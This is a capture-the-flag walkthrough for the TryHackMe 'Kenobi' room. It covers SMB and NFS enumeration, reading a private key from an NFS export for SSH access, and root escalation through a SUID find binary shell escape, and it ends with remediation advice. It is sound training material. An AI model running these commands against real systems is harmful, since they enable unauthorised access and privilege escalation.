> [!NOTE]
> **Room notes.** Values obtained in the live room are redacted and command output
> is illustrative. Work the instance to obtain the real values.

## Executive summary

Kenobi exposes three services: SMB, a ProFTPD instance and NFS. The room's lesson
is selection — deciding which service is the intended path, and why the others are
either a distraction or a supporting clue.

The chain is: enumerate SMB for a share, discover a credential hint, mount NFS to
read a private key, then escalate through a misconfigured binary.

## Room information

| Field | Value |
| --- | --- |
| Platform | TryHackMe |
| Room | Kenobi |
| Difficulty | Easy |
| Operating system | Linux |
| Category | Linux, service enumeration |
| Skills | SMB, NFS, SUID analysis, credential reuse |

## Objectives

- Enumerate SMB and NFS and interpret share permissions.
- Use information from one service to unlock another.
- Escalate using a legitimately configured but unsafe binary feature.
- Document the decision points, not just the commands.

## Tools used

| Tool | Purpose |
| --- | --- |
| `nmap` | Service discovery |
| `smbclient`, `smbmap` | SMB enumeration |
| `showmount`, `mount` | NFS inspection |
| `searchsploit` | Version research |
| `gobuster` | Web enumeration |

## Initial reconnaissance

```bash
nmap -Pn -sV -sC -p- <room-ip> -oN nmap-kenobi.txt
```

Expect:

| Port | Service | Note |
| --- | --- | --- |
| 21 | ProFTPD | Version matters |
| 22 | SSH | Key-based access likely |
| 80 | HTTP | Small site |
| 111/2049 | NFS | Share enumeration |
| 139/445 | SMB | Share enumeration |

Five services is enough to require a plan. Record the versions before choosing.

## Enumeration

### SMB

```bash
smbclient -L //<room-ip>/ -N
smbmap -H <room-ip>
```

Look for a readable share with an unusual name. Read its contents, including any
files that look like notes or logs. A share often contains the first credential or
the first hint.

```bash
smbclient //<room-ip>/<share> -N
> ls
> get <file>
```

### NFS

```bash
showmount -e <room-ip>
```

An exported directory with a permissive host range can be mounted locally:

```bash
mkdir -p /tmp/kenobi
sudo mount -t nfs <room-ip>:/export/kenobi /tmp/kenobi
ls -la /tmp/kenobi
```

Read the contents. A private key or an id_rsa here is the pivot.

### Web

```bash
gobuster dir -u http://<room-ip>/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
```

A small site often hides one interesting route. Check the HTML source for
comments and author names.

### ProFTPD

The version is the clue. Search for it:

```bash
searchsploit proftpd <version>
```

If a public module vulnerability applies, it may allow file copy rather than
execution — which is still useful if the copied file is a key.

## Vulnerability identification

Two findings usually combine:

1. **Information exposure.** SMB or NFS exposes material that should not be
   readable without authentication.
2. **Unsafe feature use.** A local binary is configured to run an external program
   with elevated privileges, so controlling that program controls the privilege.

Neither is an exploit chain on its own; together they produce one.

## Exploitation

1. Use the readable share to discover a username or hint.
2. Mount NFS and read the private key.
3. Use the key for SSH access as the user who owns it.

```bash
chmod 600 kenobi_id_rsa
ssh -i kenobi_id_rsa <user>@<room-ip>
```

If the key is passphrase-protected and the room provides a passphrase hint, apply
it here. Record which service produced which piece of the puzzle.

> [!TIP]
> When several services are exposed, write a one-line hypothesis for each before
> testing. It prevents an hour of wandering between them.

## Privilege escalation

The classic path on this room is a `find` binary with the SUID bit or an equivalent
permission that lets it run commands as root.

Check first:

```bash
id
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

If `find` is SUID:

```bash
find . -exec /bin/sh -p \; -quit
```

Verify the resulting identity:

```bash
id
```

The lesson is not the payload. It is that GTFOBins-style abuse works whenever a
binary with elevated privileges can be made to execute another program. The fix is
to remove the bit and use a capability or a wrapper with a fixed argument list.

## Flags and completion evidence

Flags are redacted. Record:

- Which service exposed each hint.
- Which file provided the key.
- The exact SUID binary and its mode.

## Lessons learned

- Multiple services require a prioritisation decision.
- NFS exports are frequently over-permissive.
- A private key is often more valuable than a password hash.
- SUID on an interpreter-capable binary is root.
- Version banners guide research but need confirmation.

## Mitigation and remediation

| Issue | Control |
| --- | --- |
| Anonymous SMB access | Require authentication, restrict shares |
| NFS exported to any host | Restrict by host and use `root_squash` |
| SUID on general-purpose binaries | Remove the bit; use least privilege |
| Weak credential hygiene | Unique credentials per service |

## References

- TryHackMe — Kenobi room.
- GTFOBins — SUID abuse reference.
- NFS documentation for export options.
